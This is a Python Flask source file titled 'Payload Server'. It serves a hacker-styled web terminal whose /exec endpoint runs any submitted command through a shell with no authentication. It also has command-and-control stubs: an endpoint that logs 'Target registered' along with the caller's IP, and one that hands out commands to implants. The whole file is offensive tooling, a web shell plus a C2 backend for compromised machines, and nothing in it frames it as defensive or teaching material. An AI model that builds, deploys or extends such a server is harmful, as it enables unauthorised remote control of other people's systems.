#!/usr/bin/env python3
from flask import Flask, request, jsonify, render_template_string
import os
import datetime
import subprocess
import json

app = Flask(__name__)

# Render ke health check ke liye
@app.route('/healthz')
@app.route('/health')
@app.route('/ping')
def health_check():
    return 'OK', 200

HTML = '''
<!DOCTYPE html>
<html>
<head><title>🔥 Payload Server</title>
<style>
    body{background:#0a0e27;color:#00ff9d;font-family:monospace;padding:20px}
    .terminal{background:#000;padding:15px;border-radius:5px;height:400px;overflow:auto}
    input{background:#000;color:#0f0;border:1px solid #0f0;padding:10px;width:80%}
    button{background:#0f0;color:#000;padding:10px 20px}
</style>
</head>
<body>
<h2>🚀 CUSTOM PAYLOAD SERVER (RENDER)</h2>
<div class="terminal" id="term">[*] Server ready<br>[*] Waiting for connections...<br></div>
<input type="text" id="cmd" placeholder="command"><button onclick="sendCmd()">Run</button>
<script>
    async function sendCmd(){
        let cmd=document.getElementById('cmd').value;
        if(!cmd) return;
        let term=document.getElementById('term');
        term.innerHTML+='<br>$> '+cmd+'<br>';
        let res=await fetch('/exec',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd:cmd})});
        let data=await res.json();
        term.innerHTML+=data.output+'<br>';
        term.scrollTop=term.scrollHeight;
        document.getElementById('cmd').value='';
    }
</script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/exec', methods=['POST'])
def execute():
    cmd = request.json.get('cmd', '')
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if not output: output = '[+] Done'
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'output': f'Error: {str(e)}'})

# Payload builder ke liye endpoints
@app.route('/api/register', methods=['POST'])
def register():
    print(f"[+] Target registered: {request.remote_addr}")
    return jsonify({'status': 'ok'})

@app.route('/api/command', methods=['GET'])
def get_command():
    return jsonify({'command': ''})  # No pending commands

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    print(f"Server running on port {port}")
    app.run(host='0.0.0.0', port=port)
